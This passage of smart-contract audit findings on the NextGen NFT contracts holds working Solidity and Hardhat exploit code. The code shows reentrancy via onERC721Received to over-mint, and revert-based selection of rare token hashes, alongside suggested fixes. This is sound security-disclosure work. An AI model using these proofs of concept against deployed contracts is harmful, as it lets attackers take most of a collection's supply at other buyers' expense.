     (,,,uint256 totalSupply) = genCore.retrieveCollectionAdditionalData(1);

    if(genCore.viewCirSupply(2) < totalSupply) {  
        ++ count;
        console.log("Reentry count : ", count );      

			// repeated entries            
        minterContract.burnToMint(1, // _burnCollectionID (i.e, collection 1)
			                             10000000420, // Adam's mintpass _tokenID
			                             2, // _mintCollectionID )
     } else {
        reenter = false;
        console.log("\n>>>Attack completed ");
        console.log("Attacker NFT balance after Attack ", genCore.balanceOf(address(this)) );  
     }
    }
```

The above PoC shows Adam (attacker) ends up with majority of the `collection 2` NFTs 
by burning just a single `collection 1` mintpass.

Resulting in 
1. making the other unused mint passes worthless.
2. Leading to loss of funds for users who spent funds in acquiring such mint passes.
3. centralised token distrubution
4. Loss of trust and legitamacy of the protocol. 

## Tools Used

Foundry, Manual Analysis.

## Recommended Mitigation Steps

Use a ReEntrancy Guard.
Follow CEI pattern. 
Burn the mint pass NFT before making the external call to mint a new collection.


## Assessed type

Reentrancy

# Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L189-L200


# Vulnerability details

## Impact

Not following the recommended Checks-Effects-Interaction pattern in `mint()` function allows
Contract addresses to re-enter using the `onERC721Received()` hook 
and mint more NFTs than they were allowed, 
both during the allowlist & public sale phases.

## Proof of Concept

Likelihood: High 
Impact : High

Ownership distribution & trust of the community are important metrics for an NFT collection.
Allowing certain malicious actors to accumulate majority of the supply 
can lead to serious questions and distrust among the community.

Alice = Attacker

The Reentrancy arises from the fact that the  `_safemint()` external call is made 
before updating the 2 important mappings `tokensMintedAllowlistAddress` and `tokensMintedPerAddress`. 

`tokensMintedAllowlistAddress` represents the number of NFTs minted by an address during allowlist phase
and 
`tokensMintedPerAddress` represents the number of NFTs minted by an address during public sale phase

The `_safemint()` function calls the `onERC721Received()` on the NFT receiving contract 
to ensure it can safely handle NFTs before minting.

The Issue here is that, using this hook, 
a malicious contract can callback into the `NextGenMinterContract` 
to execute subsequent mints before the above mentioned mappings are updated.
This can be repeated until the total Supply of the collection is exhausted.


Lets consider, a new collection gets created for `public sale` with following important parameters. 

Collection ID = 1
TotalSupply =  1000
collectionMintCost = 0.1 Ether
maxCollectionPurchases = 2  ( Maximum of 2 NFTs allowed per address during public)

`Alice` is the attacker here and 
wants to get as many NFTs for themselves, 
even though the contract intends only a maximum of 2 NFTs per address during the public sale.


For the sake of this example, 
Lets only consider the important parameters required to illustrate this attack.
Assume Alice has 100 ether

and initiates the attack like so
Step 1

```
function initiateAttack() external {
        // Initiate call to the target contract
        console.log("Initiating attack on :", address(minterContract));

        minterContract.mint {value : 0.1 ether}
                            (1, // _collectionID
                             1, // _numberOfTokens
                             0, // _maxAllowance - allowlist sale limit - not relavant for this example
                             '{"tdh": "100"}',  // _tokenData
                             address(this)); // _mintTo

    }
```

Step 2
```
function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC721Received.selector;
    } 
```

Step 3
```
function _reentrancyCallback() internal  {

        if (reenter) {
            // Execute attack
            _executeAttack();

        } else if (!reenter) {
            // Already ran the attack once
            console.log("\n>>> Attack completed ");
        } 
    }
```

Step 4
```
function _executeAttack() internal  {
     (,,,uint256 totalSupply) = genCore.retrieveCollectionAdditionalData(1);

    if(genCore.viewCirSupply(1) < totalSupply) {  
        ++ count;
        console.log("Reentry count : ", count );                  
        minterContract.mint {value : 0.1 ether}
                            (1,
                             1,
                             0,
                            '{"tdh": "100"}', 
                            address(this));
     } else {
        reenter = false;
        console.log(">>> All punks in my bag <<<");
        console.log("Attacker NFT balance after Attack ", genCore.balanceOf(address(this)) );  
     }
    }
```
The above PoC shows Alice ends up with much more NFTs than intended by the NextGen system.

Note that, 
`the same attack can be executed during an allowlist sale.` 
which is even more critical. 

As majority of the allowlisted members and the public will end up with no supply to mint.

This can lead to serious confidence issues among the NFT community regarding the legitimacy of the project.

## Tools Used

Foundry, Manual Analysis.

## Recommended Mitigation Steps

Follow the check-effects-interaction pattern.

Update the state mappings `tokensMintedAllowlistAddress` and `tokensMintedPerAddress` 
before the external calls.





## Assessed type

Reentrancy

# Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerNXT.sol#L58


# Vulnerability details

## Vulnerability Details
When `NextGenRandomizerNXT` is used the hash is known when `onERC721Received` is called
An attacker can revert if they don't like the generated hash in `onERC721Received`
It does not matter even if `NextGenRandomizerNXT` is truly random, all that matter is that hash is known and the attacker can revert if they don't like it
Or they can cancel their transaction, see [Understanding the Meebits Exploit](https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281) for more details of the similar attack
## Impact
Attacker can choose a hash, mint only the rarest tokens.
## Proof of Concept
Put the contract below in hardhat/smart-contracts
```solidity
// SPDX-License-Identifier: MIT
import {IERC721Receiver} from "./IERC721Receiver.sol";
import "./NextGenCore.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.19;

contract ChoosesTokenHash is IERC721Receiver {
    NextGenCore core;

    constructor(NextGenCore _core){
        core = _core;
    }

    function onERC721Received(
        address ,
        address ,
        uint256 tokenId,
        bytes calldata 
    ) external returns (bytes4) {
        // 1/64 chance that starts with 0x00
        bytes1 preferedFirstNumber = 0;
        bytes32 hash = core.retrieveTokenHash(tokenId);
        console.logBytes32(hash);
        if (bytes1(hash) != preferedFirstNumber) {
            revert();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
```
Put the test file below to `hardhat/tests/fileName.test.js` and run `npx hardhat test test/fileName.test.js`
```js
// @ts-check
const TEST_NAME = "Attacker can choose tokenHash when `NextGenRandomizerNXT` is used";
const {
    loadFixture,
  } = require("@nomicfoundation/hardhat-toolbox/network-helpers")
const { expect } = require("chai");
// @ts-ignore
const { ethers } = require("hardhat");
const fixturesDeployment = require("../scripts/fixturesDeployment.js")

let signers
let contracts
let attacker;
const COLLECTION_ID = 1;

describe("NextGen Tests", function () {
    beforeEach(async function () {
      ;({ signers, contracts } = await loadFixture(fixturesDeployment))
      attacker = signers.addr3;

      await contracts.hhCore.addMinterContract(
        contracts.hhMinter
      );
    })

    context(TEST_NAME, () => {
        beforeEach(async function () {
            const totalSupply = 1_000;
            const collectionId = await createCollection(totalSupply);
            expect(collectionId).to.eq(COLLECTION_ID);
        })

        it("attacks", async function() {
            const  attackerContract = (await ( await 
                ethers.getContractFactory("ChoosesTokenHash"))
                    .deploy(contracts.hhCore))
                        .connect(attacker); 

            let hasSucceeded = false;
            let tx;
            while(!hasSucceeded) {
                try {
                    tx = await  contracts.hhMinter.mint(
                        COLLECTION_ID, // _collectionID
                        1, // _numberOfTokens
                        0, // _maxAllowance
                        '', // _tokenData
                        attackerContract, // _mintTo
                        [], // _merkleRoot
                        ethers.ZeroAddress, // _delegator
                        0, //_varg0
                    );
                    hasSucceeded = true;
                } catch {
                    // NOP
                }
            }

            const tokenId = (await getLastMintedTokenIds(tx))[0];
            const hash = await contracts.hhCore.retrieveTokenHash(tokenId);
            expect(hash).to.satisfy(h => h.startsWith('0x00'));
        });
});
});


async function createCollection(totalSupply) {
    const collectionId = await contracts.hhCore.newCollectionIndex();
    const collectionAdmin = signers.addr1;

    await contracts.hhCore.createCollection(
        `Test Collection ${collectionId}`,
        `Artist ${collectionId}`,
        "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", ["desc"]
    );
    await contracts.hhAdmin.registerCollectionAdmin(
        collectionId, // _collectionID
        collectionAdmin.address,
        true
    );
    await contracts.hhCore.connect(collectionAdmin).setCollectionData(
        collectionId,
        collectionAdmin.address, // _collectionArtistAddress
        10, // _maxCollectionPurchases
        totalSupply, // _collectionTotalSupply
        0, // _setFinalSupplyTimeAfterMint
    );
    await contracts.hhMinter.setCollectionCosts(
        collectionId,
        0, // _collectionMintCost
        0, // _collectionEndMintCost
        0, // _rate
        2000, // _timePeriod
        1, // _salesOptions
        '0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B', // delAddress
    );

    const publicStartTimestamp = await getLatestBlockTimestamp();
    const publicEndTimestamp = publicStartTimestamp + 1000;
    await contracts.hhMinter.setCollectionPhases(
        collectionId,
        0, // _allowlistStartTime
        0, // _allowlistEndTime
        publicStartTimestamp, // _publicStartTime
        publicEndTimestamp, // _publicEndTime
        "0x633522a1353f0e3bf991364afc2d74b59b938bad1726812e25d9f9c09d90b06a"  // _merkleRoot
    );

    await contracts.hhCore.addRandomizer(
        collectionId, contracts.hhRandomizer,
    );

    return collectionId;
}

async function getLastMintedTokenIds(tx) {
    return (await tx.wait()).logs
        .map(log => {
            try {
                return new ethers.Interface([
                    "event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)"
                ]).parseLog(log);
            } catch (error) {
                return null;
            }
        })
        .filter(parsedLog => parsedLog && parsedLog.name === "Transfer")
        .map(log => log.args.tokenId)
}

async function getLatestBlockTimestamp() {
    // @ts-ignore
    return (await ethers.provider.getBlock("latest")).timestamp;
}

